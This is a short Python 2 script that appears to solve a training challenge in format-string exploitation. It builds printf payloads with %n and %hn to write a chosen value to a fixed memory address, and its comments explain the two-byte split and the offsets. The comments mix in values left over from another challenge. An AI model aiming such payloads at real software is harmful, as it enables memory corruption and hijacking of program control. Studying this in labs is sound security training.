import struct
import os

# Challenge: write 0x080484b4 at 0x08049724

''' working exploit - 1

payload = struct.pack("I", 0x80496f4) #+ "%131$08x"
payload += "%16930112d" + "%12$08n"

'''

''' Worming exploit - 2 
So the trick here is to split 0x01025544 into 0x0102 and 0x5544 and write them in two consecutive 2bytes memory addresses.

0x0804 = 2052 
0x84b4 = 33972

So we need to write 2052 into 0x08049722 (target + 2 address) and 33972 into 0x08049724 (target address) since we are using a little indian 
system. Also, we only want to write two bytes, so we will use %hn for that.

Also, the arguments to printf will be addresses so 4 bytes each. If our buffer starts in the offset 4, 
then the next printf argument (5) will be 4 bytes from the beggining of our buffer, 
and thats where we need to place the address of the 2 LSB bytes

'''

payload = struct.pack("I",0x08049722) + struct.pack("I",0x08049724)
payload += "%2044d" + "%4$hn" + "%31920d" + "%5$hn"

print payload
